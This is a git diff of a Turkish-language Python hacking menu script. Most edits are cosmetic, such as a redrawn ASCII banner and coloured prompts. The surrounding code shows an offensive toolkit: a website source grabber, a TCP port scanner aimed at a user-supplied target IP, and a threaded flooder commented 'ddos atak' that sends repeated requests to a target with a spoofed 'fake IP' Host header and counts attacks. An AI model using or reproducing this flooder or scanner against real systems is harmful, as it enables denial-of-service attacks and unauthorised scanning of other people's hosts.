@@ -24,32 +24,23 @@ from colorama import Fore, Back, Style
 import requests as req
 
 
-
-
-
-
-
 logo = """                                                                                                                                                                                                      
     '########:'##::::'##:'########::'##:::'##:'##::::'##::::'###:::::'######:: '##:::'##:
     ::: ##..:: ##:::: ##: ##.... ##: ##::'##:: ##:::: ##:::'## ##:::'##... ##: ##::'##::.
     ::: ##:::: ##:::: ##: ##:::: ##: ##:'##::: ##:::: ##::'##:. ##:: ##:::..:: ##:'##::::
     ::: ##:::: ##:::: ##: ########:: #####:::: #########:'##:::. ##: ##::::::: #####:::::
-    ::: ##:::: ##:::: ##: ##.. ##::: ##. ##::: ##.... ##: #########: ##::::::: ##. ##::::
-    ::: ##:::: ##:::: ##: ##::. ##:: ##:. ##:: ##:::: ##: ##.... ##: ##::: ## ##:. ##::::
-    ::: ##::::. #######:: ##:::. ##: ##::. ##: ##:::: ##: ##:::: ##:. ######::##::. ##:::
-    :::..::::::.......:::..:::::..::..::::..::..:::::..::..:::::..:::......:::..::::..:::                                                                                                                         
-    ::::::::::::::::::::'########:'########::::'###::::'##::::'##::::::::::::::::::::::::
-    ::::::::::::::::::::.. ##..:: ##.....::::'## ##::: ###::'###:::::::::::::::::::::::::
-    :::::::::::::::::::::: ##:::: ##::::::::'##:. ##:: ####'####:::::::::::::::::::::::::
-    :::::::::::::::::::::: ##:::: ######:::'##:::. ##: ## ### ##:::::::::::::::::::::::::
-    :::::::::::::::::::::: ##:::: ##...:::: #########: ##. #: ##:::::::::::::::::::::::::
-    ::::::::::::::::::::: ##:::: ##::::::: ##.... ##: ##:.:: ##: ::::::::::::::::::::::::                   
-    ::::::::::::::::::::: ##:::: ########: ##:::: ##: ##:::: ##: ::::::::::::::::::::::::
-    ::::::::::::::::::::::..:::::........::..:::::..::..:::::..::::::::::::::::::::::::::
-           M.Kemal ATATÜRK     v1.1.0
-           
-"""   
-print(Fore.RED + Style.BRIGHT + logo + Style.RESET_ALL + Style.BRIGHT +"\n") 
+    ::: ##:::: ##:::: ##: ##.. ##::: ##. ##::: ##.... ##: #########: ##::::::: ##. ##:::/
+    ::: ##:::: #########: ##::. ##:: ##:. ##:: ##:::: ##: ##.... ##: ##::: ## ##:. ##::/
+        ##_____ _____    _##  __##__ ##   ##   ##     ##  ##     ##  ######## ##   ## /
+	|_   _| ____|  / \  |  \/  | ##        ##                                    /
+	  | | |  _|   / _ \ | |\/| |------------------------------------------------/
+	  | | | |___ / ___ \| |  | |
+	  |_| |_____/_/   \_\_|  |_|
+		   M.Kemal ATATÜRK     v1.1.0                                                                                                                           
+""" 
+
+ 
+print(Fore.GREEN + Style.BRIGHT + logo + Style.RESET_ALL + Style.BRIGHT +"\n") 
 #print(logo)
 while True:
     b="""                            
@@ -65,42 +56,39 @@ while True:
     # |----------------------------------------|     ##                ÖZELLİKLER               #
     # | TWİTTER :  xyxALpHA                    |     ##      ******          EKLENECEK          #
     # |----------------------------------------|     ## ________________________________________#
-    #                                                ## son güncelleme: 12-05-2021    01:13     #
+    #                                                ## son güncelleme: 13-05-2021    23:41     #
     #############################################################################################
     """
     #print(logo)
-    print(b)
+    print(Fore.BLUE + Style.BRIGHT + b + Style.RESET_ALL + Style.BRIGHT +"\n")
 
-    import requests as req
     soru = input(">>>[+]İSLEM NUMARASI GİRİNİZ:")
 
 
     if soru == "1":
-
         import requests as req
  
 
         while True:
-            import requests as req
+
             url = input(">>>[+]URL GİRİNİZ : ")
-            print(">>{}".format(url))
+            print(Fore.RED + ">>{}".format(url))
             print("\n")
-            aralik = int(input(">>>[+]CEKMEK İSTEDİGİNİZ SATIR SAYISI :"))
-            print("{}".format(aralik))
-            import requests as req
+            aralik = int(input(Fore.GREEN + ">>>[+]CEKMEK İSTEDİGİNİZ SATIR SAYISI :"))
+            print(Fore.RED + "{}".format(aralik))
             r = req.get(url)
             yaz = r.text
 
-            sor = input(">>>[+]BİLGİLERİ NE YAPMAK İSTERSİNİZ? [k]aydet / [s]il / [o]ku :")
+            sor = input(Fore.GREEN + ">>>[+]BİLGİLERİ NE YAPMAK İSTERSİNİZ? [k]aydet / [s]il / [o]ku :")
 
 
             if sor == "k":
-                dosya_adi = input(">>>[+]DOSYA İSMİ VE UZANTISI GİRİNİZ :")
+                dosya_adi = input(Fore.GREEN + ">>>[+]DOSYA İSMİ VE UZANTISI GİRİNİZ :")
                 yenidosya = os.open(dosya_adi,os.O_RDWR|os.O_CREAT)
                 os.write(yenidosya,yaz.encode())
                 os.close(yenidosya)
-                print("BİLGİLER {} DOSYASINA BASARIYLA KAYDEDİLDİ [SUCCESFULLY]".format(dosya_adi))
-                okumak = input("DOSYAYI OKUMAK İSTERMİSİNİZ [e]/[h] :")
+                print(Fore.BLUE + "BİLGİLER {} DOSYASINA BASARIYLA KAYDEDİLDİ [SUCCESFULLY]".format(dosya_adi))
+                okumak = input(Fore.GREEN + "DOSYAYI OKUMAK İSTERMİSİNİZ [e]/[h] :")
 
                 if okumak == "e":
 
@@ -110,7 +98,7 @@ while True:
                     print(icerik.decode())
 
                 else:
-                    print("İSLEM BASARILI..")
+                    print(Fore.GREEN + "İSLEM BASARILI..")
 
             elif sor == "o":
                 try:
@@ -118,19 +106,19 @@ while True:
                 except:
                     pass
                 finally:
-                    print("{} WEB SİTESİNE AİT KAYNAK KODLARINI GORUYORSUNUZ".format(url))
+                    print(Fore.RED + "{} WEB SİTESİNE AİT KAYNAK KODLARINI GORUYORSUNUZ".format(url))
 
             else:
 
-                print("İŞLEM İPTAL EDİLDİ..")
+                print(Fore.RED + "İŞLEM İPTAL EDİLDİ..")
 
-            islem = input("BASKA İSLEM YAPMAK İSTER MİSİNİZ? [e]/[h] : ")
+            islem = input(Fore.GREEN + "BASKA İSLEM YAPMAK İSTER MİSİNİZ? [e]/[h] : ")
 
             if islem == "e":
 
                 continue
             elif islem == "h":
-                print("CIKIS BASARILI")
+                print(Fore.BLUE + "CIKIS BASARILI")
                 break
     
                 #dongu=input("BASKA İSLEM YAPMAK İSTER MİSİNİZ? [e]/[h] : ")
@@ -149,8 +137,8 @@ while True:
 
 
 
-        target = input(">>>[+]URL GİRİNİZ : https://")
-        print("taranıyor...bekleyiniz...")
+        target = input(Fore.GREEN + ">>>[+]URL GİRİNİZ : https://")
+        print(Fore.RED + "taranıyor...bekleyiniz...")
         #ip = socket.gethostbyname(target)
 
 
@@ -213,7 +201,7 @@ while True:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SIRAYLA PORTLARI TARA--KULLANICIYA BİLDİR
     
 
-        target = input("[+] HEDEF IP ADRESİ: ")
+        target = input(Fore.GREEN + ">>>[+]HEDEF IP ADRESİ: ")
         def scanner(port):
             try:
                 sock.connect((target, port))
@@ -222,7 +210,7 @@ while True:
                 return False
 
         for portNumber in range(1,100):
-            print("PORT TARANIYOR", portNumber)
+            print(Fore.RED + "PORT TARANIYOR", portNumber)
             if scanner(portNumber):
                 print('[*] Port', portNumber, '/tcp','is open')
         
@@ -234,9 +222,9 @@ while True:
         import socket
         import threading
 
-        target = input("HEDEF IP:")
-        fake_ip = input("SAHTE IP:")   #ddos atak
-        port = int(input("PORT:"))
+        target = input(Fore.RED + "HEDEF IP:")
+        fake_ip = input(Fore.GREEN + "SAHTE IP:")   #ddos atak
+        port = int(input(Fore.BLUE + "PORT:"))
     
 
 
@@ -249,7 +237,7 @@ while True:
             s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
         
             attack_num += 1
-            print("İSLEM BASARİLİ - ATAK NUMARASI {} : ",format(attack_num))
+            print(Fore.GREEN + "İSLEM BASARİLİ - ATAK NUMARASI {} : ",format(attack_num))
             s.close()
 
 
@@ -263,36 +251,14 @@ while True:
 
     else:
 
-        print("HATA : GECERLİ BİR SECİM YAPMADINIZ!!")
+        print(Fore.RED + "HATA : GECERLİ BİR SECİM YAPMADINIZ!!")
 
-    dongu=input("BAŞKA BİR İŞLEM YAPMAK İSTİYOR MUSUNUZ? [e]/[h] : ")
+    dongu=input(Fore.BLUE + "BAŞKA BİR İŞLEM YAPMAK İSTİYOR MUSUNUZ? [e]/[h] : ")
 
     if dongu == "e":
         continue
     elif dongu == "h":
         break
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
